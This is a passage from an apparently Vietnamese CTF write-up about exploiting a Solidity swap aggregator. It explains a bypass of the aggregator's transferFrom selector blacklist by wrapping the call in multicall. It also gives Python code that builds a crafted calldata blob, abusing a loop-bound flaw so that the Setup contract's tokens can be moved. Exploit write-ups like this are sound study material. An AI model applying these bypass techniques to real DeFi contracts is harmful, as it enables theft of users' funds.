</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="n">nativeAmount</span><span class="p">)</span> <span class="o">=</span> <span class="n">getInput</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">outputPtr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">outputLength</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">assembly</span> {
</span></span><span class="line"><span class="cl">        <span class="n">outputLength</span> <span class="o">:=</span> <span class="n">shr</span><span class="p">(</span><span class="mi">240</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">1</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">switch</span> <span class="n">shr</span><span class="p">(</span><span class="mi">224</span><span class="p">,</span> <span class="nf">mload</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="mi">32</span><span class="p">)))</span> <span class="c1">// selector
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">case</span> <span class="mi">0</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// InvalidSelector
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nf">mstore</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="mh">0x7352d91c00000000000000000000000000000000000000000000000000000000</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nf">revert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">case</span> <span class="mh">0x23b872dd</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// Blacklist transferFrom in custom calls
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">// InvalidTransferFromCall
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nf">mstore</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="mh">0x1751a8e400000000000000000000000000000000000000000000000000000000</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nf">revert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="p">...</span>
</span></span></code></pre></div><p>Thay vì gọi trực tiếp <code>transferFrom</code>, mình đóng gói (wrap) lệnh <code>transferFrom</code> vào bên trong hàm <code>multicall(bytes[])</code> vì <code>WannaCoin</code> kế thừa từ <code>Multicall</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sol" data-lang="sol"><span class="line"><span class="cl"><span class="k">abstract</span> <span class="kd">contract</span> <span class="nc">Multicall</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">     * @dev Receives and executes a batch of function calls on this contract.
</span></span></span><span class="line"><span class="cl"><span class="cm">     * @custom:oz-upgrades-unsafe-allow-reachable delegatecall
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">multicall</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span><span class="p">[]</span> <span class="n">calldata</span> <span class="nb">data</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">external</span> <span class="k">virtual</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bytes</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">results</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">results</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">bytes</span><span class="p">[](</span><span class="nb">data</span><span class="p">.</span><span class="n">length</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">data</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">results</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">Address</span><span class="p">.</span><span class="n">functionDelegateCall</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="nb">data</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">results</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Và từ đây, <code>aggregator</code> chỉ kiểm tra selector của hàm lớp ngoài cùng (ở đây là <code>multicall</code> - <code>0xac9650d8</code>). Do đó, nó cho phép lệnh đi qua và ta thực hiện chuyển tiền thành công.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">sel_transfer</span> <span class="o">=</span> <span class="n">get_selector</span><span class="p">(</span><span class="s2">&#34;transferFrom(address,address,uint256)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">params_transfer</span> <span class="o">=</span> <span class="n">encode</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s1">&#39;address&#39;</span><span class="p">,</span> <span class="s1">&#39;address&#39;</span><span class="p">,</span> <span class="s1">&#39;uint256&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="n">SETUP_ADDRESS</span><span class="p">,</span> <span class="n">coin_address</span><span class="p">,</span> <span class="n">setup_balance</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">inner_call</span> <span class="o">=</span> <span class="n">sel_transfer</span> <span class="o">+</span> <span class="n">params_transfer</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sel_multicall</span> <span class="o">=</span> <span class="n">get_selector</span><span class="p">(</span><span class="s2">&#34;multicall(bytes[])&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">params_multicall</span> <span class="o">=</span> <span class="n">encode</span><span class="p">([</span><span class="s1">&#39;bytes[]&#39;</span><span class="p">],</span> <span class="p">[[</span><span class="n">inner_call</span><span class="p">]])</span>
</span></span><span class="line"><span class="cl"><span class="n">final_payload_bytes</span> <span class="o">=</span> <span class="n">sel_multicall</span> <span class="o">+</span> <span class="n">params_multicall</span>
</span></span></code></pre></div><p>Hơn nữa, tôi còn thấy lỗi logic trong vòng lặp Command ở <code>Aggregator.sol</code>. Hàm <code>execute</code> xác định điểm kết thúc vòng lặp <code>commandsOffsetEnd</code> dựa trên độ dài của toàn bộ dữ liệu đầu vào <code>swapArgsLength</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sol" data-lang="sol"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">getCommandData</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span>
</span></span><span class="line"><span class="cl">    <span class="k">pure</span>
</span></span><span class="line"><span class="cl">    <span class="k">returns</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint16</span> <span class="n">commandsOffset</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint16</span> <span class="n">commandsOffsetEnd</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint16</span> <span class="n">outputsLength</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">assembly</span> {
</span></span><span class="line"><span class="cl">        <span class="n">commandsOffset</span> <span class="o">:=</span> <span class="nf">add</span><span class="p">(</span><span class="mi">70</span><span class="p">,</span> <span class="n">shr</span><span class="p">(</span><span class="mi">240</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="mi">68</span><span class="p">)))</span> <span class="c1">// dataOffset + dataLength
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">commandsOffsetEnd</span> <span class="o">:=</span> <span class="nf">add</span><span class="p">(</span><span class="mi">68</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="mi">36</span><span class="p">))</span> <span class="c1">// commandsOffsetEnd / swapArgsOffset + swapArgsLength (swapArgsOffset - 32)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">outputsLength</span> <span class="o">:=</span> <span class="n">shr</span><span class="p">(</span><span class="mi">240</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="mi">70</span><span class="p">))</span> <span class="c1">// dataOffset + 32
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Do đó, tôi đặt một <code>blob</code> lớn (800 bytes) và Command thực thi (Action Call) nằm ở 9 bytes cuối cùng của blob <code>COMMAND_ABS</code> rồi sau đó chỉnh sửa header <code>commandsOffset</code> để trỏ thẳng xuống cuối blob này. Lúc này, vòng lặp chạy đúng 1 lần duy nhất cho Command và sau đó i += 9 sẽ vượt quá độ dài file, vòng lặp kết thúc an toàn mà không chạy vào vùng dữ liệu rác gây lỗi.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">blob_size</span> <span class="o">=</span> <span class="mi">800</span>
</span></span><span class="line"><span class="cl"><span class="n">blob</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">blob_size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ABS_START</span> <span class="o">=</span> <span class="mi">68</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">set_val</span><span class="p">(</span><span class="n">offset_abs</span><span class="p">,</span> <span class="n">value_bytes</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">blob</span><span class="p">[</span><span class="n">offset_abs</span> <span class="o">-</span> <span class="n">ABS_START</span> <span class="p">:</span> <span class="n">offset_abs</span> <span class="o">-</span> <span class="n">ABS_START</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">value_bytes</span><span class="p">)]</span> <span class="o">=</span> <span class="n">value_bytes</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">set_ptr</span><span class="p">(</span><span class="n">ptr_index_abs</span><span class="p">,</span> <span class="n">target_abs</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">blob</span><span class="p">[</span><span class="n">ptr_index_abs</span> <span class="o">-</span> <span class="n">ABS_START</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x00</span> 
</span></span><span class="line"><span class="cl">    <span class="n">blob</span><span class="p">[</span><span class="n">ptr_index_abs</span> <span class="o">-</span> <span class="n">ABS_START</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">target_abs</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">    <span class="n">blob</span><span class="p">[</span><span class="n">ptr_index_abs</span> <span class="o">-</span> <span class="n">ABS_START</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">target_abs</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">COIN_ADDR_ABS</span> <span class="o">=</span> <span class="mi">200</span>
</span></span><span class="line"><span class="cl"><span class="n">SEQ_HEADER_ABS</span> <span class="o">=</span> <span class="mi">300</span>
</span></span><span class="line"><span class="cl"><span class="n">PAYLOAD_DATA_ABS</span> <span class="o">=</span> <span class="mi">350</span>
</span></span><span class="line"><span class="cl"><span class="n">DEADLINE_VAL_ABS</span> <span class="o">=</span> <span class="mi">600</span>
</span></span><span class="line"><span class="cl"><span class="n">ZERO_ZONE_ABS</span> <span class="o">=</span> <span class="mi">700</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">COMMAND_ABS</span> <span class="o">=</span> <span class="mi">68</span> <span class="o">+</span> <span class="n">blob_size</span> <span class="o">-</span> <span class="mi">9</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">coin_bytes</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">coin_address</span><span class="p">[</span><span class="mi">2</span><span class="p">:])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">cmd_offset_val</span> <span class="o">=</span> <span class="n">COMMAND_ABS</span> <span class="o">-</span> <span class="mi">70</span>
</span></span><span class="line"><span class="cl"><span class="n">blob</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">cmd_offset_val</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl"><span class="n">blob</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">cmd_offset_val</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">blob</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">24</span><span class="p">]</span> <span class="o">=</span> <span class="n">coin_bytes</span>
</span></span><span class="line"><span class="cl"><span class="n">blob</span><span class="p">[</span><span class="mi">24</span><span class="p">:</span><span class="mi">44</span><span class="p">]</span> <span class="o">=</span> <span class="n">coin_bytes</span>
</span></span><span class="line"><span class="cl"><span class="n">blob</span><span class="p">[</span><span class="mi">44</span><span class="p">:</span><span class="mi">64</span><span class="p">]</span> <span class="o">=</span> <span class="n">coin_bytes</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">set_ptr</span><span class="p">(</span><span class="mi">132</span><span class="p">,</span> <span class="n">DEADLINE_VAL_ABS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">set_ptr</span><span class="p">(</span><span class="mi">135</span><span class="p">,</span> <span class="n">ZERO_ZONE_ABS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">set_ptr</span><span class="p">(</span><span class="mi">138</span><span class="p">,</span> <span class="n">ZERO_ZONE_ABS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">set_ptr</span><span class="p">(</span><span class="mi">141</span><span class="p">,</span> <span class="n">ZERO_ZONE_ABS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">set_val</span><span class="p">(</span><span class="n">COIN_ADDR_ABS</span><span class="p">,</span> <span class="n">coin_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">set_val</span><span class="p">(</span><span class="n">PAYLOAD_DATA_ABS</span><span class="p">,</span> <span class="n">final_payload_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">set_val</span><span class="p">(</span><span class="n">DEADLINE_VAL_ABS</span><span class="p">,</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span> <span class="o">+</span> <span class="mi">9999999</span><span class="p">)</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="s1">&#39;big&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">seq_hdr_idx</span> <span class="o">=</span> <span class="n">SEQ_HEADER_ABS</span> <span class="o">-</span> <span class="n">ABS_START</span>
</span></span><span class="line"><span class="cl"><span class="n">p_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">final_payload_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">blob</span><span class="p">[</span><span class="n">seq_hdr_idx</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x04</span>
</span></span><span class="line"><span class="cl"><span class="n">blob</span><span class="p">[</span><span class="n">seq_hdr_idx</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">PAYLOAD_DATA_ABS</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl"><span class="n">blob</span><span class="p">[</span><span class="n">seq_hdr_idx</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">PAYLOAD_DATA_ABS</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl"><span class="n">blob</span><span class="p">[</span><span class="n">seq_hdr_idx</span><span class="o">+</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">p_len</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl"><span class="n">blob</span><span class="p">[</span><span class="n">seq_hdr_idx</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">p_len</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SEQUENCE_END_ABS</span> <span class="o">=</span> <span class="n">SEQ_HEADER_ABS</span> <span class="o">+</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">cmd_idx</span> <span class="o">=</span> <span class="n">COMMAND_ABS</span> <span class="o">-</span> <span class="n">ABS_START</span>
</span></span><span class="line"><span class="cl"><span class="n">blob</span><span class="p">[</span><span class="n">cmd_idx</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x00</span>
</span></span><span class="line"><span class="cl"><span class="n">blob</span><span class="p">[</span><span class="n">cmd_idx</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x00</span>
</span></span><span class="line"><span class="cl"><span class="n">blob</span><span class="p">[</span><span class="n">cmd_idx</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x00</span>
</span></span><span class="line"><span class="cl"><span class="n">blob</span><span class="p">[</span><span class="n">cmd_idx</span><span class="o">+</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">SEQ_HEADER_ABS</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span> 
</span></span><span class="line"><span class="cl"><span class="n">blob</span><span class="p">[</span><span class="n">cmd_idx</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">SEQ_HEADER_ABS</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl"><span class="n">blob</span><span class="p">[</span><span class="n">cmd_idx</span><span class="o">+</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">SEQUENCE_END_ABS</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span> 
</span></span><span class="line"><span class="cl"><span class="n">blob</span><span class="p">[</span><span class="n">cmd_idx</span><span class="o">+</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">SEQUENCE_END_ABS</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl"><span class="n">blob</span><span class="p">[</span><span class="n">cmd_idx</span><span class="o">+</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">COIN_ADDR_ABS</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span> 
</span></span><span class="line"><span class="cl"><span class="n">blob</span><span class="p">[</span><span class="n">cmd_idx</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">COIN_ADDR_ABS</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span></code></pre></div><p>Ngoài ra, hàm swap gọi <code>Calldata.getSwapData()</code>. Hàm này đọc trực tiếp từ <code>calldata</code> để lấy <code>toAddress</code>, <code>deadline</code>, v.v. Nếu dữ liệu này không hợp lệ (ví dụ <code>deadline</code> quá khứ, hoặc address bằng 0), transaction sẽ bị revert.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sol" data-lang="sol"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">getSwapData</span><span class="p">()</span> <span class="k">internal</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="n">SwapData</span> <span class="k">memory</span> <span class="n">swapData</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">assembly</span> {
</span></span><span class="line"><span class="cl">        <span class="ow">let</span> <span class="nv">deadline</span> <span class="o">:=</span> <span class="n">shr</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">shr</span><span class="p">(</span><span class="mi">248</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="mi">132</span><span class="p">)),</span> <span class="c1">// dataOffset + 62
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nf">calldataload</span><span class="p">(</span><span class="n">shr</span><span class="p">(</span><span class="mi">240</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="mi">133</span><span class="p">)))</span> <span class="c1">// dataOffset + 62 + 1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">if</span> <span class="nf">lt</span><span class="p">(</span><span class="n">deadline</span><span class="p">,</span> <span class="nf">timestamp</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// ExpiredTransaction
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nf">mstore</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="mh">0x931997cf00000000000000000000000000000000000000000000000000000000</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nf">revert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">mstore</span><span class="p">(</span><span class="n">swapData</span><span class="p">,</span> <span class="n">shr</span><span class="p">(</span><span class="mi">96</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="mi">72</span><span class="p">)))</span> <span class="c1">// toAddress / dataOffset + 2
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mstore</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">swapData</span><span class="p">,</span> <span class="mi">32</span><span class="p">),</span> <span class="n">shr</span><span class="p">(</span><span class="mi">96</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="mi">92</span><span class="p">)))</span> <span class="c1">// fromAssetAddress / dataOffset + 22
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mstore</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">swapData</span><span class="p">,</span> <span class="mi">64</span><span class="p">),</span> <span class="n">shr</span><span class="p">(</span><span class="mi">96</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="mi">112</span><span class="p">)))</span> <span class="c1">// toAssetAddress / dataOffset + 42
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mstore</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">swapData</span><span class="p">,</span> <span class="mi">96</span><span class="p">),</span> <span class="n">deadline</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mstore</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="nf">add</span><span class="p">(</span><span class="n">swapData</span><span class="p">,</span> <span class="mi">128</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">shr</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="n">shr</span><span class="p">(</span><span class="mi">248</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="mi">135</span><span class="p">)),</span> <span class="c1">// dataOffset + 62 + 3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nf">calldataload</span><span class="p">(</span><span class="n">shr</span><span class="p">(</span><span class="mi">240</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="mi">136</span><span class="p">)))</span> <span class="c1">// dataOffset + 62 + 4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span> <span class="c1">// amountOutMin
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mstore</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="nf">add</span><span class="p">(</span><span class="n">swapData</span><span class="p">,</span> <span class="mi">160</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">shr</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="n">shr</span><span class="p">(</span><span class="mi">248</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="mi">138</span><span class="p">)),</span> <span class="c1">// dataOffset + 62 + 6
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nf">calldataload</span><span class="p">(</span><span class="n">shr</span><span class="p">(</span><span class="mi">240</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="mi">139</span><span class="p">)))</span> <span class="c1">// dataOffset + 62 + 7
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span> <span class="c1">// swapFee
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mstore</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="nf">add</span><span class="p">(</span><span class="n">swapData</span><span class="p">,</span> <span class="mi">192</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">shr</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="n">shr</span><span class="p">(</span><span class="mi">248</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="mi">141</span><span class="p">)),</span> <span class="c1">// dataOffset + 62 + 9
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nf">calldataload</span><span class="p">(</span><span class="n">shr</span><span class="p">(</span><span class="mi">240</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="mi">142</span><span class="p">)))</span> <span class="c1">// dataOffset + 62 + 10
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span> <span class="c1">// amountIn
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// calldataload(144) // r
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// calldataload(176) // s
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// shr(248, calldataload(208)) // v
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="ow">let</span> <span class="nv">hasPermit</span> <span class="o">:=</span> <span class="nf">gt</span><span class="p">(</span><span class="n">shr</span><span class="p">(</span><span class="mi">248</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="mi">209</span><span class="p">)),</span> <span class="mi">0</span><span class="p">)</span> <span class="c1">// permit v
